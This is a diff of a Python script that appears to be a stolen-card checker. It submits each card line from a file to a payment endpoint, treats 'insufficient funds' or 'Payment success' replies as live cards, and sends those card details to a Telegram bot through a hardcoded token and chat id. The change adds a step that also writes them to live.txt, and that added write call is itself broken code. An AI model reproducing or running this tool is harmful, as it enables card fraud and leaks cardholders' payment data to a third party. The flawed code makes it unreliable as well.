@@ -175,8 +175,10 @@ for P in file.readlines():
 )
 	try:
 		if "Your card has insufficient funds." in response.text or "Your card does not support this type of purchase." in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text:
-			requests.post(f"""https://api.telegram.org/bot6309640432:AAF325SmhJAN_MpCCcqm9S7awWmjWY-_IrU/sendmessage?chat_id=5372825497&text={start_num}{P}""")
-			print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
+			with open('live.txt', 'a') as file:
+				file.write(P, response.json + '\n')
+				requests.post(f"""https://api.telegram.org/bot6309640432:AAF325SmhJAN_MpCCcqm9S7awWmjWY-_IrU/sendmessage?chat_id=5372825497&text={start_num}{P}""")
+				print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
 		else:
 			print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
 	except:
